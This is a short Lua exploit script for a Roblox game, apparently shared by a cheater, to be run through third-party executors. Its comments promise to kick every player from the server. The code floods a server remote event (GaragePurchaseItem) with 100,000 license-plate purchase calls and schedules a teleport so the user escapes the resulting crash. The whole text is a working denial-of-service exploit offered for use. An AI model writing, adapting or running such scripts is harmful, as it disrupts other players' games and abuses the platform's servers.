-- made by bread 
-- get in a car, execute and watch everybody get kicked out of the game
-- supported execs: JJsploit, Solara, Xeno, LX63 (i haven't tried with others lol)
task.delay(5, function()
     game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
end)

for i = 1, 100000 do
      game:GetService("ReplicatedStorage").GaragePurchaseItem:FireServer("LicensePlate", string.rep(i, 5))
end
